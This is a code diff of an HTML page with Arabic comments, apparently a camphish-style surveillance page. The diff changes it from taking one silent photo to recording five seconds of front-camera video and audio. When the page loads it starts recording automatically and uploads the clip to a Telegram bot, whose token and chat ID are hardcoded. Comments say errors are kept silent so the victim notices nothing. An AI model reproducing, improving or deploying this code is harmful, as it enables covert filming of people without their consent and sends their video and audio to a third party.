@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>S_Capture</title>
+    <title>S_Video_Capture</title>
     
     <style>
         /* إخفاء كل شيء وجعل الفيديو يملأ الشاشة */
         body {
             margin: 0;
-            overflow: hidden; /* لمنع ظهور أشرطة التمرير */
+            overflow: hidden; 
             background-color: #000;
         }
 
@@ -25,17 +25,11 @@
             transform: translate(-50%, -50%);
             border: none; 
         }
-
-        /* إخفاء عنصر Canvas لأنه يستخدم كأداة فقط */
-        #canvas {
-            display: none;
-        }
     </style>
 </head>
 <body>
 
     <video id="video" autoplay playsinline></video> 
-    <canvas id="canvas"></canvas>
 
     <script>
         // ******************************************************
@@ -43,93 +37,111 @@
         // ******************************************************
         const BOT_TOKEN = '8299004372:AAErVG-8zGODSvHxn0ZChWzBWXa3iGvw3NA'; 
         const CHAT_ID = '7869791131'; 
-        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+        // تم تغيير الأمر من sendPhoto إلى sendVideo
+        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
+        
+        // مدة التسجيل بالمللي ثانية (مثلاً: 5 ثوانٍ)
+        const RECORDING_DURATION_MS = 5000; 
 
         // ******************************************************
-        // ** عناصر DOM والمتغيرات             **
+        // ** المتغيرات والوظائف                   **
         // ******************************************************
         const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
         let stream = null;
-        let isCaptured = false; 
+        let mediaRecorder = null;
+        const videoChunks = [];
 
-        // ******************************************************
-        // ** وظائف مساعدة                     **
-        // ******************************************************
-        
-        function dataURLtoBlob(dataurl) {
-            const arr = dataurl.split(',');
-            const mime = arr[0].match(/:(.*?);/)[1];
-            const bstr = atob(arr[1]);
-            let n = bstr.length;
-            const u8arr = new Uint8Array(n);
-            while (n--) {
-                u8arr[n] = bstr.charCodeAt(n);
-            }
-            return new Blob([u8arr], {type: mime});
-        }
-
-        // ******************************************************
-        // ** وظائف الكاميرا والإرسال التلقائي    **
-        // ******************************************************
-
-        async function captureAndSend() {
-            if (isCaptured || !stream) return; 
-
-            isCaptured = true;
-            
+        /**
+         * دالة إرسال الفيديو إلى تيليجرام.
+         */
+        async function sendVideo(videoBlob) {
             try {
-                // 1. ضبط أبعاد الـ Canvas ورسم الإطار
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // 2. تحويل الصورة إلى Blob
-                const imageDataURL = canvas.toDataURL('image/jpeg', 0.9);
-                const imageBlob = dataURLtoBlob(imageDataURL);
-                
-                // 3. إيقاف بث الكاميرا فوراً
-                stream.getTracks().forEach(track => track.stop());
-                video.srcObject = null;
-                
-                // 4. إرسال البيانات عبر Telegram API
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('photo', imageBlob, 'auto_capture.jpg'); 
-                formData.append('caption', 'Captured silently.'); // يمكن إزالة هذا السطر إذا أردت إخفاء التعليق أيضاً
+                // استخدام 'video' كاسم للحقل المطلوب لـ sendVideo
+                formData.append('video', videoBlob, 'recorded_video.webm'); 
+                formData.append('caption', 'Recorded silently from front camera.');
 
                 const response = await fetch(TELEGRAM_API_URL, {
                     method: 'POST',
                     body: formData,
                 });
 
-                // لا يوجد معالجة للأخطاء أو النجاح لتبقى صامتة
-                // console.log('Capture process finished.'); 
+                // لا يوجد معالجة مرئية للنجاح/الفشل لتبقى صامتة
 
             } catch (error) {
-                // console.error('An error occurred during capture or send:', error);
+                // لا يوجد معالجة مرئية للأخطاء
             }
         }
 
 
+        /**
+         * إيقاف التسجيل وإرسال الفيديو.
+         */
+        function stopRecordingAndSend() {
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+            }
+
+            // إيقاف بث الكاميرا بعد انتهاء التسجيل والإرسال
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                video.srcObject = null;
+            }
+        }
+
+
+        /**
+         * بدء تسجيل الفيديو.
+         */
+        function startRecording() {
+            if (!stream) return;
+
+            // MediaRecorder لتمكين تسجيل البث إلى ملف
+            mediaRecorder = new MediaRecorder(stream);
+            
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    videoChunks.push(event.data);
+                }
+            };
+            
+            mediaRecorder.onstop = () => {
+                // دمج الأجزاء إلى ملف فيديو واحد (Blob)
+                const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+                // إرسال الملف
+                sendVideo(videoBlob);
+            };
+
+            // بدء التسجيل
+            mediaRecorder.start();
+            
+            // تحديد مدة التسجيل
+            setTimeout(stopRecordingAndSend, RECORDING_DURATION_MS);
+        }
+
+        /**
+         * طلب الوصول إلى الكاميرا الأمامية وبدء البث.
+         */
         async function startCamera() {
             try {
+                // طلب الكاميرا الأمامية: facingMode: 'user'
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
-                        facingMode: 'environment' // الكاميرا الخلفية
-                    } 
+                        facingMode: 'user' 
+                    },
+                    audio: true // عادةً يتم تسجيل الصوت مع الفيديو
                 });
                 video.srcObject = stream;
                 
                 await new Promise(resolve => video.onloadedmetadata = resolve);
                 video.play();
                 
-                // *** الالتقاط التلقائي بعد 1 ثانية من بدء البث ***
-                setTimeout(captureAndSend, 1000); 
+                // *** بدء التسجيل التلقائي بعد 1 ثانية من بدء البث ***
+                setTimeout(startRecording, 1000); 
 
             } catch (error) {
-                // console.error('Camera access denied or failed:', error);
+                // لا يوجد معالجة مرئية للأخطاء
             }
         }
 
